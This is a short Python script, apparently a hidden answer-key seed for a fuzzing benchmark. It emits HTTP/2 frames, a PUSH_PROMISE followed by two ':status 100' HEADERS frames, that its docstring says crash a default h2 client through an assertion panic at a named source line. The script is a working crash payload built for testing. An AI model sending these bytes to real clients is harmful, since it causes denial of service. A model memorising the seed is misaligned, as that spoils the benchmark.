#!/usr/bin/env python3
"""Gold-seed generator for the h2 benchmark target (oracle — never shipped in the image).

Emits the wire bytes that panic a default-config h2 client at
src/proto/streams/counts.rs:111 (assert!(!is_counted)) on the pinned commit:
  PUSH_PROMISE(stream=1, promised=2) -> HEADERS(:status 100, stream=2) x2

Usage: python3 gold_push_panic.py > gold.bin && /work/riptarget gold.bin  # exit 101
"""
import struct
import sys


def frame(ty, flags, stream, payload):
    return (
        len(payload).to_bytes(3, "big")
        + bytes([ty, flags])
        + struct.pack(">I", stream & 0x7FFFFFFF)
        + payload
    )


def indexed(i):
    return bytes([0x80 | i])


def lit_idx_name(idx, val):
    return bytes([idx]) + bytes([len(val)]) + val


def lit_new_name(name, val):
    return b"\x00" + bytes([len(name)]) + name + bytes([len(val)]) + val


promised_req = indexed(2) + indexed(4) + indexed(7) + lit_idx_name(1, b"x")
push = frame(0x5, 0x4, 1, struct.pack(">I", 2) + promised_req)  # PUSH_PROMISE
interim = lit_new_name(b":status", b"100")
sys.stdout.buffer.write(push + frame(0x1, 0x4, 2, interim) + frame(0x1, 0x4, 2, interim))
